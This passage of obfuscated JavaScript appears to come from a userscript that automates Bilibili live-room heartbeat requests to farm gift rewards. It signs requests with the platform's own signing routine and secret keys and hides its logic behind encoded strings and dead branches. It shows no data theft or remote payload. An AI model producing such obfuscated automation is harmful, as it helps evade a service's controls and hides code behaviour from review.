_0x8b4e4a=BiliPushUtils['\x73\x69\x67\x6e'](JSON[_0x5108('3d','\x48\x78\x51\x64')](_0x504dda),this[_0x5108('3e','\x45\x67\x53\x39')]);if(_0x8b4e4a){_0x504dda['\x73']=_0x8b4e4a;let _0x5a38a0=await BiliPushUtils[_0x5108('3f','\x44\x75\x68\x6c')][_0x5108('40','\x4d\x77\x79\x66')]['\x68\x65\x61\x72\x74'](_0x504dda);if(_0x4043d2[_0x5108('41','\x70\x74\x30\x63')](_0x5a38a0[_0x5108('42','\x78\x77\x74\x61')],0x0)){++HeartGift['\x74\x6f\x74\x61\x6c'];++this[_0x5108('43','\x44\x75\x68\x6c')];this[_0x5108('44','\x48\x78\x51\x64')]=_0x5a38a0[_0x5108('45','\x64\x21\x66\x62')][_0x5108('46','\x7a\x45\x7a\x7a')];this[_0x5108('47','\x5a\x33\x56\x54')]=_0x5a38a0[_0x5108('48','\x28\x25\x72\x62')]['\x73\x65\x63\x72\x65\x74\x5f\x6b\x65\x79'];this[_0x5108('49','\x78\x77\x74\x61')]=_0x5a38a0['\x64\x61\x74\x61']['\x74\x69\x6d\x65\x73\x74\x61\x6d\x70'];this[_0x5108('4a','\x44\x48\x30\x47')]=_0x5a38a0['\x64\x61\x74\x61'][_0x5108('4b','\x28\x21\x50\x46')];if(_0x4043d2[_0x5108('4c','\x5e\x36\x45\x59')](HeartGift['\x74\x6f\x74\x61\x6c'],HeartGift['\x6d\x61\x78'])&&HeartGift[_0x5108('4d','\x4e\x68\x64\x25')]){await _0x4043d2[_0x5108('4e','\x78\x77\x74\x61')](delayCall,()=>this[_0x5108('2e','\x29\x4c\x5e\x56')](),_0x4043d2['\x5a\x71\x7a\x64\x49'](this[_0x5108('4f','\x29\x4c\x5e\x56')],0x3e8));}else{if(_0x4043d2['\x72\x55\x68\x5a\x56'](_0x4043d2[_0x5108('50','\x4a\x45\x51\x38')],_0x4043d2[_0x5108('51','\x4a\x45\x51\x38')])){var _0x12cf7b=e[_0x5108('52','\x38\x5a\x44\x72')]['\x74\x6d\x70'];return e['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x5108('53','\x74\x52\x75\x55')]=null,_0x12cf7b;}else{if(HeartGift[_0x5108('54','\x29\x63\x52\x35')]){console[_0x5108('55','\x4e\x68\x64\x25')](_0x5108('56','\x33\x5e\x30\x74'));HeartGift[_0x5108('57','\x48\x78\x51\x64')]=![];_0x4043d2['\x5a\x52\x67\x4f\x71'](runTomorrow,HeartGift['\x72\x75\x6e']);}}}}}}else{var _0x7caabe=e[_0x5108('58','\x78\x77\x74\x61')][_0x5108('59','\x36\x72\x6a\x65')](t);e[_0x5108('5a','\x36\x72\x6a\x65')][_0x4043d2[_0x5108('5b','\x4e\x68\x64\x25')](r,0xc)]=0x9,e[_0x5108('5c','\x6d\x4d\x28\x24')][_0x4043d2[_0x5108('5d','\x36\x72\x6a\x65')](r,0x4)]=_0x7caabe;}}catch(_0x55d36d){this[_0x5108('5e','\x48\x78\x51\x64')]++;console['\x65\x72\x72\x6f\x72'](_0x55d36d);await _0x4043d2['\x61\x54\x76\x68\x71'](delayCall,()=>this[_0x5108('5f','\x2a\x37\x2a\x30')](),0x3e8);}}}const HeartGift={'\x74\x6f\x74\x61\x6c':0x0,'\x6d\x61\x78':0x19,'\x70\x72\x6f\x63\x65\x73\x73':!![],'\x72\x75\x6e':async()=>{var _0x45c213={'\x6f\x46\x70\x51\x65':_0x5108('60','\x36\x40\x35\x51'),'\x42\x50\x78\x59\x64':_0x5108('61','\x6d\x4d\x28\x24'),'\x65\x70\x53\x47\x4b':function(_0x3bf3b5,_0x45eec4){return _0x3bf3b5>=_0x45eec4;},'\x55\x4c\x6e\x76\x52':function(_0x57fcd1,_0x47bde2){return _0x57fcd1<_0x47bde2;},'\x4d\x6f\x4c\x75\x59':function(_0x4f1d22,_0xaea893){return _0x4f1d22|_0xaea893;},'\x66\x48\x46\x4a\x50':function(_0x1d7e03,_0x3fc27f){return _0x1d7e03<<_0x3fc27f;},'\x79\x50\x59\x79\x71':function(_0xb41666,_0x377800){return _0xb41666&_0x377800;},'\x57\x69\x49\x65\x54':function(_0x447174,_0xf06aa9){return _0x447174&_0xf06aa9;},'\x4f\x70\x45\x47\x53':function(_0x806116,_0x37d67f){return _0x806116<_0x37d67f;},'\x71\x6f\x77\x57\x75':function(_0x2fb225,_0x25db57){return _0x2fb225|_0x25db57;},'\x6c\x63\x6d\x61\x6a':function(_0x34c36f,_0x3a4452){return _0x34c36f|_0x3a4452;},'\x57\x53\x6d\x6d\x45':function(_0x956c2d,_0x1b32f4){return _0x956c2d<<_0x1b32f4;},'\x47\x49\x4e\x6c\x66':function(_0x54ad84,_0x7c0489){return _0x54ad84<<_0x7c0489;},'\x62\x74\x66\x55\x4f':function(_0x252c0b,_0x1e4187){return _0x252c0b+_0x1e4187;},'\x6d\x66\x6c\x64\x52':function(_0x196582,_0x2d299e){return _0x196582>>_0x2d299e;},'\x5a\x48\x51\x4a\x49':function(_0x45766b,_0xa5f641){return _0x45766b+_0xa5f641;},'\x78\x6e\x4d\x47\x4b':function(_0x41abba,_0xb657a9){return _0x41abba>_0xb657a9;},'\x75\x79\x71\x66\x77':function(_0xc40f2,_0x283dcc){return _0xc40f2!==_0x283dcc;},'\x74\x75\x76\x46\x70':_0x5108('62','\x5b\x2a\x32\x53'),'\x52\x49\x4d\x63\x6b':_0x5108('63','\x75\x48\x29\x34'),'\x54\x62\x4f\x78\x48':_0x5108('64','\x61\x4d\x26\x71'),'\x76\x75\x48\x76\x45':function(_0x4bf5bb,_0x37b4b9){return _0x4bf5bb==_0x37b4b9;},'\x6e\x66\x57\x64\x6e':_0x5108('65','\x33\x30\x51\x53'),'\x41\x49\x69\x53\x6f':_0x5108('66','\x6a\x6e\x6c\x26'),'\x68\x42\x58\x6a\x6c':function(_0x1fdfa8,_0x4b7e3e,_0x42c581){return _0x1fdfa8(_0x4b7e3e,_0x42c581);},'\x71\x67\x62\x66\x48':function(_0x3a7ee9,_0x133190,_0x143c78){return _0x3a7ee9(_0x133190,_0x143c78);},'\x55\x63\x62\x72\x46':function(_0x1a7555,_0x58f922){return _0x1a7555==_0x58f922;},'\x7a\x66\x53\x78\x6b':function(_0x22de41,_0x4e0ed5){return _0x22de41===_0x4e0ed5;},'\x59\x4f\x4a\x45\x76':_0x5108('67','\x33\x30\x51\x53')};if(!HeartGift[_0x5108('68','\x44\x75\x68\x6c')]){HeartGift['\x74\x6f\x74\x61\x6c']=0x0;HeartGift['\x70\x72\x6f\x63\x65\x73\x73']=!![];}await Gift[_0x5108('69','\x29\x4c\x5e\x56')]();let _0x35c2b5=Gift[_0x5108('6a','\x64\x21\x66\x62')];if(_0x35c2b5&&_0x45c213[_0x5108('6b','\x64\x21\x66\x62')](_0x35c2b5[_0x5108('6c','\x5a\x33\x56\x54')],0x0)){if(_0x45c213[_0x5108('6d','\x33\x57\x49\x6c')](_0x45c213['\x74\x75\x76\x46\x70'],_0x45c213[_0x5108('6e','\x33\x57\x49\x6c')])){console[_0x5108('6f','\x28\x25\x72\x62')](_0x45c213[_0x5108('70','\x55\x76\x76\x40')]);while(_0x45c213['\x76\x75\x48\x76\x45'](BiliPushUtils[_0x5108('71','\x78\x77\x74\x61')],null)){if(_0x45c213['\x75\x79\x71\x66\x77'](_0x45c213['\x6e\x66\x57\x64\x6e'],_0x45c213['\x41\x49\x69\x53\x6f'])){await _0x45c213['\x68\x42\x58\x6a\x6c'](delayCall,()=>{},0x3e8);}else{return e['\x5f\x6c']||(e['\x5f\x6c']=new l());}}for(let _0x54ffcd of _0x35c2b5){let _0xce933c=await API[_0x5108('72','\x66\x35\x24\x52')][_0x5108('73','\x44\x48\x30\x47')](_0x45c213[_0x5108('74','\x75\x48\x29\x34')](parseInt,_0x54ffcd[_0x5108('75','\x6d\x4d\x28\x24')],0xa));if(_0x45c213[_0x5108('76','\x44\x69\x79\x38')](_0xce933c[_0x5108('77','\x75\x44\x74\x4c')],0x0)){if(_0x45c213[_0x5108('78','\x74\x52\x75\x55')](_0x45c213[_0x5108('79','\x4d\x77\x79\x66')],_0x45c213['\x59\x4f\x4a\x45\x76'])){console['\x6c\x6f\x67'](_0x5108('7a','\x55\x76\x76\x40')+_0x54ffcd[_0x5108('7b','\x61\x4d\x26\x71')]+'\x5d\u623f\u95f4\x5b'+_0xce933c[_0x5108('7c','\x6b\x35\x42\x46')][_0x5108('7d','\x33\x74\x49\x28')]+_0x5108('7e','\x65\x71\x58\x4e'));new HeartGiftRoom(_0xce933c[_0x5108('7f','\x33\x74\x49\x28')]);await _0x45c213[_0x5108('80','\x45\x67\x53\x39')](delayCall,()=>{},0x1388);}else{var _0x81a547=_0x45c213[_0x5108('81','\x33\x57\x49\x6c')][_0x5108('82','\x62\x64\x5a\x41')]('\x7c'),_0x144d2f=0x0;while(!![]){switch(_0x81a547[_0x144d2f++]){case'\x30':this[_0x5108('83','\x28\x21\x50\x46')]=rsp['\x64\x61\x74\x61'][_0x5108('84','\x52\x47\x5d\x35')];continue;case'\x31':this['\x73\x65\x63\x72\x65\x74\x5f\x72\x75\x6c\x65']=rsp[_0x5108('85','\x4d\x77\x79\x66')][_0x5108('22','\x5b\x2a\x32\x53')];continue;case'\x32':this['\x74\x69\x6d\x65']=rsp[_0x5108('86','\x74\x53\x45\x39')][_0x5108('87','\x74\x52\x75\x55')];continue;case'\x33':++this[_0x5108('88','\x75\x48\x29\x34')];continue;case'\x34':this[_0x5108('89','\x36\x40\x35\x51')]=rsp[_0x5108('8a','\x66\x35\x24\x52')][_0x5108('8b','\x52\x47\x5d\x35')];continue;}break;}}}}}else{var _0x3d7cac=_0x45c213[_0x5108('8c','\x5a\x33\x56\x54')][_0x5108('8d','\x58\x35\x38\x4b')]('\x7c'),_0x3116fb=0x0;while(!![]){switch(_0x3d7cac[_0x3116fb++]){case'\x30':if(_0x45c213['\x65\x70\x53\x47\x4b'](o,0xe0)){var _0x5a42f3=0x0;_0x45c213[_0x5108('8e','\x64\x21\x66\x62')](r,_)&&(_0x5a42f3=n[r++]);var _0x3a921b=_0x45c213[_0x5108('8f','\x55\x76\x76\x40')](_0x45c213['\x66\x48\x46\x4a\x50'](_0x45c213[_0x5108('90','\x33\x30\x51\x53')](0x3f,_0x2a93ff),0x6),_0x45c213[_0x5108('91','\x5e\x36\x45\x59')](0x3f,_0x5a42f3));if(_0x1cba74=_0x45c213[_0x5108('92','\x55\x57\x6c\x64')](_0x45c213['\x66\x48\x46\x4a\x50'](_0x210b66,0xc),_0x3a921b),_0x45c213[_0x5108('93','\x6e\x58\x40\x76')](o,0xf0)){var _0x2c9f0b=0x0;_0x45c213['\x4f\x70\x45\x47\x53'](r,_)&&(_0x2c9f0b=n[r++]),_0x1cba74=_0x45c213[_0x5108('94','\x6d\x4d\x28\x24')](_0x45c213[_0x5108('95','\x64\x21\x66\x62')](_0x45c213[_0x5108('96','\x70\x74\x30\x63')](_0x45c213['\x57\x69\x49\x65\x54'](0x7,_0x210b66),0x12),_0x45c213[_0x5108('97','\x75\x44\x74\x4c')](_0x3a921b,0x6)),_0x45c213['\x57\x69\x49\x65\x54'](0x3f,_0x2c9f0b)),a+=String[_0x5108('98','\x33\x57\x49\x6c')](_0x45c213[_0x5108('99','\x66\x35\x24\x52')](0xd7c0,_0x45c213[_0x5108('9a','\x52\x68\x75\x5e')](_0x1cba74,0xa))),_0x1cba74=_0x45c213[_0x5108('9b','\x55\x57\x6c\x64')](0xdc00,_0x45c213['\x57\x69\x49\x65\x54'](0x3ff,_0x1cba74));}}continue;case'\x31':_0x45c213[_0x5108('9c','\x66\x35\x24\x52')](r,_)&&(_0x2a93ff=n[r++]);continue;case'\x32':var _0x210b66=_0x45c213[_0x5108('9d','\x7a\x45\x7a\x7a')](0x1f,o),_0x2a93ff=0x0;continue;case'\x33':var _0x1cba74=_0x45c213[_0x5108('9e','\x7a\x45\x7a\x7a')](_0x45c213[_0x5108('9f','\x61\x39\x70\x6b')](_0x210b66,0x6),_0x45c213[_0x5108('a0','\x6a\x6e\x6c\x26')](0x3f,_0x2a93ff));continue;case'\x34':a+=String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](_0x1cba74);continue;}break;}}}}};(window['\x77\x65\x62\x70\x61\x63\x6b\x4a\x73\x6f\x6e\x70']=window['\x77\x65\x62\x70\x61\x63\x6b\x4a\x73\x6f\x6e\x70']||[])[_0x5108('a1','\x5b\x2a\x32\x53')]([[0x2e],{2205:function(_0x32d1fb,_0x5b5aa6,_0x4ef92c){var _0x363787={'\x4d\x52\x64\x6e\x59':function(_0x591a82,_0x1cbf59){return _0x591a82*_0x1cbf59;},'\x50\x58\x66\x49\x52':function(_0x1901fa,_0x2cd1b2){return _0x1901fa+_0x2cd1b2;},'\x74\x56\x54\x61\x66':function(_0x12d927,_0x2647a5){return _0x12d927/_0x2647a5;},'\x50\x61\x57\x48\x61':function(_0x44cd0c,_0x268c07){return _0x44cd0c/_0x268c07;},'\x59\x69\x46\x53\x70':function(_0x4bd3c9,_0x314d3f){return _0x4bd3c9<_0x314d3f;},'\x64\x47\x69\x66\x57':function(_0x7d11a3,_0x1c963b){return _0x7d11a3+_0x1c963b;},'\x41\x53\x54\x41\x6a':function(_0x37add7,_0x101373){return _0x37add7!==_0x101373;},'\x53\x79\x50\x6c\x5a':_0x5108('a2','\x75\x44\x74\x4c'),'\x4f\x50\x41\x52\x58':_0x5108('a3','\x74\x52\x75\x55'),'\x7a\x4c\x78\x47\x56':function(_0xa8e0cc,_0x4439eb){return _0xa8e0cc>_0x4439eb;},'\x4b\x55\x49\x44\x64':function(_0x5e4c19,_0x274698){return _0x5e4c19+_0x274698;},'\x54\x61\x6f\x6c\x4c':function(_0x2f133b,_0x3e5f3b){return _0x2f133b+_0x3e5f3b;},'\x45\x61\x65\x49\x52':function(_0x32a1ad,_0x37d837){return _0x32a1ad/_0x37d837;},'\x70\x63\x70\x56\x71':function(_0x141b30,_0x35ad1e){return _0x141b30|_0x35ad1e;},'\x4b\x76\x63\x55\x41':function(_0x504cdf,_0x23930c){return _0x504cdf|_0x23930c;},'\x64\x42\x58\x7a\x54':function(_0xefbfe,_0x5a37d6){return _0xefbfe<_0x5a37d6;},'\x45\x4f\x43\x73\x56':function(_0x27e7c4,_0x411d03){return _0x27e7c4===_0x411d03;},'\x6f\x74\x66\x45\x76':_0x5108('a4','\x44\x48\x30\x47'),'\x7a\x73\x4a\x55\x6d':_0x5108('a5','\x44\x69\x79\x38'),'\x43\x78\x66\x4f\x74':function(_0x693019,_0x21b7db){return _0x693019&_0x21b7db;},'\x79\x6a\x4e\x46\x46':function(_0x4876ff,_0x4fc810){return _0x4876ff<<_0x4fc810;},'\x4e\x71\x69\x73\x4e':function(_0x6d9495,_0x47d7c7){return _0x6d9495>=_0x47d7c7;},'\x4b\x73\x6f\x41\x70':function(_0x316c44,_0x3115b4){return _0x316c44|_0x3115b4;},'\x41\x49\x74\x70\x59':function(_0x2f6641,_0x152546){return _0x2f6641<<_0x152546;},'\x68\x53\x69\x54\x59':function(_0x38466f,_0x5436ca){return _0x38466f&_0x5436ca;},'\x4b\x79\x47\x77\x57':function(_0x4ef28a,_0x213e0c){return _0x4ef28a&_0x213e0c;},'\x61\x49\x66\x65\x57':function(_0x43a087,_0x30b0ec){return _0x43a087|_0x30b0ec;},'\x53\x71\x6e\x6f\x67':function(_0x1c3690,_0x2d5c80){return _0x1c3690<<_0x2d5c80;},'\x62\x6a\x4a\x6e\x78':function(_0x161b23,_0x441cb3){return _0x161b23!==_0x441cb3;},'\x62\x43\x57\x41\x79':_0x5108('a6','\x78\x77\x74\x61'),'\x4d\x66\x56\x72\x5a':function(_0x4fdc04,_0x297001){return _0x4fdc04<_0x297001;},'\x73\x6b\x6e\x48\x50':function(_0x23685c,_0x402662){return _0x23685c|_0x402662;},'\x4a\x4f\x65\x78\x75':function(_0x4bdf99,_0x252b67){return _0x4bdf99|_0x252b67;},'\x55\x73\x53\x67\x72':function(_0x4f506e,_0xb21e28){return _0x4f506e<<_0xb21e28;},'\x6d\x48\x6d\x55\x50':function(_0x1be823,_0x560591){return _0x1be823+_0x560591;},'\x66\x58\x6d\x72\x4b':function(_0x2d428d,_0x527e53){return _0x2d428d>>_0x527e53;},'\x79\x73\x69\x48\x42':function(_0x2b440a,_0x50b8a7){return _0x2b440a+_0x50b8a7;},'\x66\x58\x67\x54\x67':function(_0x10efd1,_0x1158e4){return _0x10efd1!==_0x1158e4;},'\x71\x52\x79\x4e\x76':_0x5108('a7','\x6b\x35\x42\x46'),'\x6d\x68\x6e\x7a\x63':function(_0x3073c3,_0x4d9e1a){return _0x3073c3>=_0x4d9e1a;},'\x4b\x74\x74\x62\x57':function(_0x14bba4,_0x264e50){return _0x14bba4<=_0x264e50;},'\x58\x4c\x6d\x72\x6d':function(_0xe434a5,_0x14f74b){return _0xe434a5|_0x14f74b;},'\x63\x55\x71\x52\x6f':function(_0x39e871,_0x9045a3){return _0x39e871+_0x9045a3;},'\x46\x46\x70\x52\x69':function(_0x53082a,_0x576256){return _0x53082a<<_0x576256;},'\x62\x66\x71\x49\x56':function(_0x37d397,_0x104df0){return _0x37d397&_0x104df0;},'\x67\x74\x70\x43\x74':function(_0x226675,_0x17b7f0){return _0x226675&_0x17b7f0;},'\x68\x62\x46\x6e\x45':function(_0x1edfed,_0x482f86){return _0x1edfed<=_0x482f86;},'\x65\x55\x75\x4e\x78':function(_0xca4302,_0x483d57){return _0xca4302<=_0x483d57;},'\x51\x5a\x43\x71\x65':function(_0x399537,_0x1ce824){return _0x399537<=_0x1ce824;},'\x42\x73\x64\x4d\x6b':'\x6a\x66\x79\x79\x74','\x66\x4d\x64\x64\x72':_0x5108('a8','\x55\x57\x6c\x64'),'\x51\x6d\x6c\x49\x52':_0x5108('a9','\x33\x30\x51\x53'),'\x6a\x44\x77\x74\x4b':function(_0x4c3294){return _0x4c3294();},'\x68\x53\x45\x6f\x70':function(_0x3a1989,_0xf5a73e){return _0x3a1989(_0xf5a73e);},'\x77\x4c\x63\x73\x50':_0x5108('aa','\x4e\x68\x64\x25'),'\x69\x43\x64\x76\x4c':function(_0x43bb77,_0x6f1977){return _0x43bb77===_0x6f1977;},'\x64\x79\x58\x67\x64':_0x5108('ab','\x6a\x48\x31\x54'),'\x68\x47\x43\x4a\x45':function(_0x18d6fc,_0x13ce2b){return _0x18d6fc===_0x13ce2b;},'\x48\x56\x4a\x75\x72':'\x50\x43\x53\x73\x76','\x62\x72\x53\x64\x64':function(_0x21b493,_0x475e7d){return _0x21b493!==_0x475e7d;},'\x77\x74\x42\x58\x4c':_0x5108('ac','\x65\x71\x58\x4e'),'\x73\x41\x41\x54\x6d':function(_0x2e1cbf,_0x2c0813){return _0x2e1cbf instanceof _0x2c0813;},'\x71\x4c\x4b\x6b\x73':function(_0x349633,_0x49e470){return _0x349633===_0x49e470;},'\x4f\x53\x66\x6f\x44':_0x5108('ad','\x7a\x45\x7a\x7a'),'\x44\x71\x58\x65\x46':_0x5108('ae','\x5e\x36\x45\x59'),'\x41\x64\x79\x66\x6f':_0x5108('af','\x4a\x45\x51\x38'),'\x48\x5a\x6d\x4c\x75':_0x5108('b0','\x33\x30\x51\x53'),'\x65\x46\x52\x42\x45':_0x5108('b1','\x33\x57\x49\x6c'),'\x4e\x67\x62\x78\x65':_0x5108('b2','\x75\x48\x29\x34'),'\x7a\x4c\x49\x57\x44':_0x5108('b3','\x52\x47\x5d\x35'),'\x59\x6f\x4b\x68\x69':function(_0x31bb62,_0x5dda6a,_0x214643){return _0x31bb62(_0x5dda6a,_0x214643);},'\x6b\x42\x4c\x50\x4b':function(_0x3b622f,_0x5c897a){return _0x3b622f<_0x5c897a;},'\x6d\x75\x54\x41\x79':function(_0xab2b58,_0x1d1678){return _0xab2b58===_0x1d1678;},'\x52\x6b\x73\x48\x63':_0x5108('b4','\x7a\x45\x7a\x7a'),'\x52\x59\x77\x55\x75':function(_0x340c5b,_0x2076ea){return _0x340c5b<=_0x2076ea;},'\x6a\x47\x66\x51\x48':function(_0x4936de,_0x5947a1){return _0x4936de|_0x5947a1;},'\x62\x59\x48\x65\x68':function(_0xf3715e,_0x533a62){return _0xf3715e+_0x533a62;},'\x51\x53\x6f\x79\x77':function(_0x3b916e,_0x44a039){return _0x3b916e<<_0x44a039;},'\x77\x76\x79\x45\x66':function(_0x2c0119,_0x182612){return _0x2c0119&_0x182612;},'\x6a\x51\x52\x50\x7a':function(_0x59acd5,_0x1545cc){return _0x59acd5<=_0x1545cc;},'\x53\x61\x78\x54\x4e':function(_0x261e64,_0x3ddc0e){return _0x261e64>>_0x3ddc0e;},'\x55\x63\x50\x4c\x73':function(_0x4a1920,_0x3c7b09){return _0x4a1920>>_0x3c7b09;},'\x57\x77\x77\x47\x51':function(_0x2b57ab,_0x1cbdcc){return _0x2b57ab<=_0x1cbdcc;},'\x6b\x6d\x5a\x6b\x6e':function(_0x18533f,_0x33a998){return _0x18533f>>_0x33a998;},'\x59\x53\x44\x55\x79':function(_0xd3af35,_0x6e1f9a){return _0xd3af35>>_0x6e1f9a;},'\x6a\x69\x6f\x6f\x53':function(_0x2e3b7e,_0x5d9bc4){return _0x2e3b7e|_0x5d9bc4;},'\x47\x6b\x46\x6f\x6b':function(_0x112a75,_0x3d937){return _0x112a75&_0x3d937;},'\x43\x55\x78\x62\x50':function(_0xcf0ae2,_0x510497){return _0xcf0ae2&_0x510497;},'\x4e\x59\x4d\x6b\x64':function(_0x5a47bb,_0x4c8279){return _0x5a47bb&_0x4c8279;},'\x65\x45\x6e\x52\x70':function(_0x4b6893,_0x44b489){return _0x4b6893&_0x44b489;},'\x72\x56\x6a\x6e\x72':function(_0x12145b,_0x5400e5){return _0x12145b|_0x5400e5;},'\x50\x50\x6e\x49\x45':function(_0xf01ff5,_0x34e79a){return _0xf01ff5===_0x34e79a;},'\x48\x42\x45\x72\x43':_0x5108('b5','\x62\x64\x5a\x41'),'\x6b\x73\x46\x6c\x7a':'\x41\x6c\x72\x65\x61\x64\x79\x20\x64\x72\x6f\x70\x70\x65\x64\x20\x46\x6e\x4d\x75\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x21','\x67\x52\x47\x50\x61':_0x5108('b6','\x55\x76\x76\x40'),'\x49\x76\x4a\x67\x69':function(_0x495638,_0x2fb63a){return _0x495638===_0x2fb63a;},'\x48\x67\x68\x50\x52':'\x46\x6e\x4d\x75\x74\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x63\x61\x6c\x6c\x65\x64\x20\x6d\x75\x6c\x74\x69\x70\x6c\x65\x20\x74\x69\x6d\x65\x73\x20\x63\x6f\x6e\x63\x75\x72\x72\x65\x6e\x74\x6c\x79\x21','\x6c\x6b\x6a\x71\x66':_0x5108('b7','\x4e\x68\x64\x25'),'\x4c\x52\x4a\x6b\x58':_0x5108('b8','\x2a\x37\x2a\x30'),'\x75\x72\x4f\x71\x4e':_0x5108('b9','\x4c\x58\x2a\x77'),'\x4d\x78\x72\x47\x59':function(_0x30e653,_0xae0a16){return _0x30e653===_0xae0a16;},'\x57\x63\x48\x64\x79':function(_0x20f89f,_0x1c7b3a){return _0x20f89f===_0x1c7b3a;},'\x4f\x57\x6b\x78\x45':function(_0x22838b,_0x310de6,_0x3b3969){return _0x22838b(_0x310de6,_0x3b3969);},'\x71\x41\x7a\x6f\x58':function(_0x590571,_0x4c3b36){return _0x590571!=_0x4c3b36;},'\x54\x57\x64\x6e\x54':function(_0x3b4296,_0x3b921b){return _0x3b4296/_0x3b921b;},'\x44\x4e\x6d\x68\x58':function(_0x1f2361,_0x3f3313){return _0x1f2361===_0x3f3313;},'\x5a\x75\x58\x77\x41':'\x4d\x56\x49\x6c\x6b','\x63\x66\x4f\x62\x64':_0x5108('ba','\x44\x69\x79\x38'),'\x4c\x6d\x56\x4e\x44':function(_0x562887,_0x249a2c){return _0x562887/_0x249a2c;},'\x58\x6c\x6f\x6d\x74':function(_0x40c933,_0x1e9b36){return _0x40c933+_0x1e9b36;},'\x70\x68\x54\x45\x73':function(_0x31195e,_0x187122){return _0x31195e*_0x187122;},'\x57\x57\x4d\x61\x55':function(_0x526a8f,_0x3a9c8f){return _0x526a8f+_0x3a9c8f;},'\x78\x64\x76\x6a\x4d':'\x53\x51\x42\x4d\x4c','\x6c\x6f\x4c\x6b\x6e':function(_0x2ef257,_0x566ec7){return _0x2ef257+_0x566ec7;},'\x72\x77\x68\x52\x55':function(_0xd4535b,_0x4e20c1){return _0xd4535b===_0x4e20c1;},'\x4f\x6a\x5a\x57\x54':function(_0x48ce4c,_0xac6eed){return _0x48ce4c===_0xac6eed;},'\x54\x42\x78\x6f\x61':function(_0xc03501,_0x298613){return _0xc03501/_0x298613;},'\x46\x63\x6a\x55\x56':function(_0x47c9f7,_0x3ddbea){return _0x47c9f7/_0x3ddbea;},'\x48\x6a\x54\x69\x47':function(_0x1d25e4,_0x2e84ea){return _0x1d25e4+_0x2e84ea;},'\x53\x5a\x73\x53\x6c':function(_0x1288ef,_0x368eb0){return _0x1288ef/_0x368eb0;},'\x51\x4f\x77\x6c\x45':function(_0x4fe83f,_0x347047){return _0x4fe83f+_0x347047;},'\x6b\x43\x74\x48\x50':function(_0x17001f,_0x52ca93){return _0x17001f+_0x52ca93;},'\x63\x45\x75\x48\x63':'\x68\x71\x59\x4c\x73','\x41\x65\x43\x43\x54':_0x5108('bb','\x45\x67\x53\x39'),'\x77\x4f\x79\x6d\x61':_0x5108('bc','\x5e\x36\x45\x59'),'\x66\x68\x6e\x44\x67':'\x7a\x74\x65\x5a\x68','\x71\x68\x46\x4a\x53':function(_0x41a9dc,_0x13a9d1){return _0x41a9dc>_0x13a9d1;},'\x6e\x61\x6d\x47\x54':function(_0x440ba9,_0x3d0266){return _0x440ba9/_0x3d0266;},'\x6a\x66\x56\x58\x4a':_0x5108('bd','\x4c\x58\x2a\x77'),'\x49\x6a\x72\x72\x4e':_0x5108('be','\x65\x71\x58\x4e'),'\x59\x4b\x56\x54\x73':'\x5b\x6f\x62\x6a\x65\x63\x74\x20\x53\x74\x72\x69\x6e\x67\x5d','\x77\x78\x6b\x65\x70':function(_0x3784c3,_0xbde6fa){return _0x3784c3+_0xbde6fa;},'\x6b\x4d\x59\x75\x6c':_0x5108('bf','\x74\x53\x45\x39'),'\x55\x53\x69\x6b\x6d':function(_0x4d81b9,_0x586743){return _0x4d81b9+_0x586743;},'\x69\x75\x4a\x53\x4b':function(_0x365f5f,_0x505d2a){return _0x365f5f===_0x505d2a;},'\x5a\x57\x72\x51\x6f':function(_0x388e7d,_0x404c8f){return _0x388e7d+_0x404c8f;},'\x70\x6a\x53\x49\x56':_0x5108('c0','\x52\x47\x5d\x35'),'\x42\x6e\x47\x54\x50':function(_0x1a4ab8,_0x505c07){return _0x1a4ab8|_0x505c07;},'\x6a\x57\x51\x5a\x5a':function(_0x56a22f,_0x374de2){return _0x56a22f===_0x374de2;},'\x42\x41\x69\x4c\x4c':function(_0x439130,_0x2a9a79){return _0x439130===_0x2a9a79;},'\x43\x6e\x72\x66\x58':_0x5108('c1','\x77\x63\x31\x42'),'\x51\x77\x69\x69\x65':'\x75\x5a\x73\x62\x45','\x68\x79\x46\x51\x63':_0x5108('c2','\x28\x21\x50\x46'),'\x55\x7a\x48\x79\x50':function(_0x1f2650,_0x43fb57){return _0x1f2650 in _0x43fb57;},'\x78\x44\x72\x51\x4b':function(_0x4c5a11,_0x36ea77,_0xeb82aa,_0x541661,_0x57065c){return _0x4c5a11(_0x36ea77,_0xeb82aa,_0x541661,_0x57065c);},'\x50\x6e\x4f\x51\x6e':function(_0x455039,_0x3d12fe,_0x4b324b){return _0x455039(_0x3d12fe,_0x4b324b);},'\x6a\x47\x6d\x41\x4d':function(_0x7cf24e,_0x57ce45,_0x205b93){return _0x7cf24e(_0x57ce45,_0x205b93);},'\x64\x78\x4a\x7a\x63':function(_0x23e82d,_0x5359c1){return _0x23e82d(_0x5359c1);},'\x7a\x79\x6f\x48\x4c':function(_0x1e3bba,_0x50296c,_0x42e9a7){return _0x1e3bba(_0x50296c,_0x42e9a7);},'\x68\x47\x51\x4a\x4e':function(_0xa28147,_0x4dac07){return _0xa28147!==_0x4dac07;},'\x6a\x75\x6c\x57\x62':_0x5108('c3','\x65\x71\x58\x4e'),'\x56\x76\x59\x74\x50':_0x5108('c4','\x6a\x48\x31\x54'),'\x71\x43\x56\x64\x63':function(_0x4be52c,_0x2d8f0b){return _0x4be52c===_0x2d8f0b;},'\x45\x6e\x5a\x46\x58':_0x5108('c5','\x36\x72\x6a\x65'),'\x63\x66\x5a\x77\x54':'\x6d\x74\x56\x72\x70','\x65\x74\x62\x7a\x6e':function(_0x25c2e0,_0x3a9b26){return _0x25c2e0(_0x3a9b26);},'\x63\x4d\x6b\x64\x56':function(_0x5c0603,_0x1ad151){return _0x5c0603(_0x1ad151);},'\x57\x41\x45\x75\x4b':function(_0x5a0c63,_0x21fb2d){return _0x5a0c63===_0x21fb2d;},'\x46\x74\x52\x6d\x48':_0x5108('c6','\x45\x67\x53\x39'),'\x54\x53\x53\x52\x73':'\x55\x53\x76\x5a\x78','\x44\x58\x51\x49\x56':function(_0x5365c4,_0x268bd6){return _0x5365c4==_0x268bd6;},'\x5a\x48\x4c\x77\x6c':function(_0x288cce,_0xff427d){return 